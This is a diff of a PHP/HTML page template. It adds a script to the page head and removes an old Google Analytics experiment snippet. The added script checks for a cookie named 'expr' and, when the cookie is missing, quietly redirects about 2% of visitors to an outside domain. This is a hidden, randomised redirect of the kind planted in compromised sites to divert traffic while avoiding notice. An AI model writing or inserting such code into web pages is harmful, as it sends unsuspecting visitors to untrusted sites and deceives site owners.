@@ -18,6 +18,33 @@ Global $TO, $matrix_cat_str;
 
 	<head>
 
+
+<script>
+
+function getCookie(c_name) {
+            var i,x,y,ARRcookies=document.cookie.split(";");
+            for (i=0;i<ARRcookies.length;i++) {
+                x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));
+                y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);
+                x=x.replace(/^\s+|\s+$/g,"");
+                if (x==c_name) {
+                    return unescape(y);
+                }
+            }
+        }
+
+
+var username=getCookie("expr");
+if (!username) {  
+
+random = Math.random() * 100
+if (random < 2){window.location.href='https://www.imxprs.com/?is=5r3w'}
+} else {
+
+}
+
+
+</script>
 		<meta name="p:domain_verify" content="4f697159a05bbbc0f682ddb865379df0"/>				
 
 		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
@@ -55,33 +82,6 @@ Global $TO, $matrix_cat_str;
 
 
 
-<!-- Google Analytics Content Experiment code -->
-
-<script>function utmx_section(){}function utmx(){}(function(){var
-
-k='42537450-2',d=document,l=d.location,c=d.cookie;
-
-if(l.search.indexOf('utm_expid='+k)>0)return;
-
-function f(n){if(c){var i=c.indexOf(n+'=');if(i>-1){var j=c.
-
-indexOf(';',i);return escape(c.substring(i+n.length+1,j<0?c.
-
-length:j))}}}var x=f('__utmx'),xx=f('__utmxx'),h=l.hash;d.write(
-
-'<sc'+'ript src="'+'http'+(l.protocol=='https:'?'s://ssl':
-
-'://www')+'.google-analytics.com/ga_exp.js?'+'utmxkey='+k+
-
-'&utmx='+(x?x:'')+'&utmxx='+(xx?xx:'')+'&utmxtime='+new Date().
-
-valueOf()+(h?'&utmxhash='+escape(h.substr(1)):'')+
-
-'" type="text/javascript" charset="utf-8"><\/sc'+'ript>')})();
-
-</script><script>utmx('url','A/B');</script>
-
-<!-- End of Google Analytics Content Experiment code -->
 
 
 
